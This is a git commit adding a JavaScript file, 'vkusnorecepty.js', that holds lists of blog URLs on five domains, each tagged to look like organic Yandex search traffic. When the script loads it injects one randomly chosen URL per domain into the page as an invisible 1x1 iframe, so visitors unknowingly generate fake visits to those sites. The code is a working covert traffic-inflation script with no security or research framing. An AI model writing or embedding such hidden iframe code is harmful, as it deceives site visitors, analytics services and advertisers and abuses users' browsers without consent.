333fdd9625e1a9e820254eb48a2c5834469a57cb
amouroff <48030869+amouroff@users.noreply.github.com>
2025-07-11 10:22:51 +0300

    Add files via upload

---
+++ vkusnorecepty.js
@@ -0,0 +1,76 @@
+const links = {
+  exitguide: [
+    "https://www.exitguide.ru/2025/02/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/2025.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_31.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_3.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_54.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_83.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/it.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_12.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.exitguide.ru/2025/02/blog-post_58.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
+  ],
+  remoteguru: [
+    "https://www.remoteguru.ru/2025/02/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_95.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_45.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_86.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_33.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_52.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.remoteguru.ru/2025/02/blog-post_40.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
+  ],
+  premiumgate: [
+    "https://www.premiumgate.online/2024/11/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/2024.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/blog-post_49.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/blog-post_32.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/seo.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/blog-post_3.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.premiumgate.online/2024/11/blog-post_95.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
+  ],
+  receptyotpashi: [
+    "https://www.recepty-ot-pashi.online/2023/09/5.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_13.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_67.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/10.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_27.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_6.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_57.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_62.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.recepty-ot-pashi.online/2023/09/blog-post_56.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
+  ],
+  ochenvkusno: [
+    "https://www.ochen-vkusno.online/2024/10/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_3.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_19.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_18.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_71.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/30.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_48.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_93.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_59.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
+    "https://www.ochen-vkusno.online/2024/10/blog-post_21.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
+  ]
+};
+
+function getRandomUrl(arr) {
+  return arr[Math.floor(Math.random() * arr.length)];
+}
+
+for (const domain in links) {
+  const iframe = document.createElement('iframe');
+  iframe.src = getRandomUrl(links[domain]);
+  iframe.width = 1;
+  iframe.height = 1;
+  iframe.style.border = "0";
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+}
